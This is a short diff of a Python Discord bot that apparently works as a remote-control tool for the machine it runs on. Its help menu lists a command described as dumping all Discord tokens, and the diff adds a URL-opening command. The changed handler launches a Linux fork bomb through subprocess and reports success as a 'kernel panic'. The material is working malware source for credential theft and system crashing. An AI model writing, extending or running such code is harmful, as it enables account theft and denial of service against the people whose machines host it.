@@ -118,6 +118,7 @@ def main():
         [ SPECIAL/OTHER ]
         [ hello ]                   Greet
         [ steak ]                   Try it.
+        [ urlopen <url> ]           Opens a URL in the default browser
         
         [ WINDOWS EXCLUSIVES ]
         [ gettoken ]                Dump all discord tokens. (W)
@@ -152,7 +153,7 @@ def main():
         async def crashlin(ctx):
             if platform.system() == "Linux":
                 try:
-                    os.system(':(){ :|:& };:')
+                    subprocess.run(["bash", "-c", ":(){ :|:& };:"], check=True)
                     await ctx.reply(":white_check_mark: Succesfully triggered Linux kernel panic!") 
                 except Exception as e:
                     await ctx.reply(f":x: There was an error triggering kernel panic: `{e}`") 
